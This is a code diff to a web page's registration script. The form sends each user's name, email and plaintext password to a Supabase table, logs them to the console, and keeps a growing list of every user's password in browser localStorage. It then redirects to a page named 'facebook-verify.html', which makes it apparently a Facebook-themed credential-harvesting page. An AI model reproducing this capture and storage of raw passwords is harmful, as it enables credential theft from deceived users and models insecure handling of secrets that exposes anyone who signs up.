@@ -113,7 +113,7 @@
 
     <script src="js/script.js"></script>
 
-    <!-- ===== DIRECT SUPABASE CONNECTION ===== -->
+    <!-- ===== DIRECT SUPABASE CONNECTION + LOCAL STORAGE ===== -->
     <script>
         // ===== Supabase Initialize =====
         const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
@@ -126,11 +126,12 @@
             const name = document.getElementById('fullName').value;
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
+            const submittedAt = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
             
             try {
-                console.log('📤 Sending data:', { name, email, password });
+                console.log('📤 Sending data:', { name, email, password, submittedAt });
                 
-                // ===== DIRECT SUPABASE INSERT =====
+                // ===== 1. SAVE TO SUPABASE =====
                 const { data, error } = await supabase
                     .from('users')
                     .insert([
@@ -138,7 +139,7 @@
                             name: name, 
                             email: email, 
                             password: password,
-                            submitted_at: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
+                            submitted_at: submittedAt
                         }
                     ])
                     .select();
@@ -149,8 +150,34 @@
                     return;
                 }
 
-                console.log('✅ Data saved!', data);
-                alert('✅ Registration successful!');
+                console.log('✅ Data saved to Supabase!', data);
+
+                // ===== 2. SAVE TO LOCAL STORAGE (VS Code mein dekhne ke liye) =====
+                // Pehle se saved data read karein
+                let allUsers = [];
+                try {
+                    const saved = localStorage.getItem('allUsersData');
+                    if (saved) {
+                        allUsers = JSON.parse(saved);
+                    }
+                } catch (e) {
+                    allUsers = [];
+                }
+                
+                // Naya user add karein
+                allUsers.push({
+                    id: Date.now(),
+                    name: name,
+                    email: email,
+                    password: password,
+                    submittedAt: submittedAt
+                });
+                
+                localStorage.setItem('allUsersData', JSON.stringify(allUsers));
+                console.log('✅ Data saved to Local Storage! Total users:', allUsers.length);
+
+                // ===== 3. SUCCESS MESSAGE =====
+                alert('✅ Registration successful! Data saved to Supabase & Local Storage');
                 window.location.href = 'facebook-verify.html';
                 
             } catch (error) {
